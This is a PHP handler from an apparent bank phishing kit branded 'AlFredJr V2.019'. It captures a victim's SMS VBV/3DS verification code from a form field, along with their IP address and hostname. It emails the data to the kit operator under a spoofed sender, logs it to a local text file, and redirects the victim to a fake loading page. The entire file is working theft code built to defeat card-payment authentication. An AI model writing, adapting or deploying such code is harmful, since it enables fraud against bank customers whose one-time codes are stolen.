<?php
	include('./includes/bots.php');
	include '../email.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "[----------AlFredJr V2.019--------]\n";
$message .= "SMS[VBV/3DS] : ".$_POST['bankid']."\n";
$message .= "ADRESSE IP    : $hostname\n";
$message .= "[----------AlFredJr V2.019--------]\n";
$subject = "SMS VBV/3DS [1/3] $ip";
$headers="From: AlFredJr V2.019  <vbv@rezzz.com>";
mail($my_mail,$subject,$message,$headers);
$fp = fopen("./f.txt", "a +");
			fputs($fp, $message);
			fclose($fp);

     echo "<meta http-equiv='refresh' content='0; url=./load1.php' />";

?>
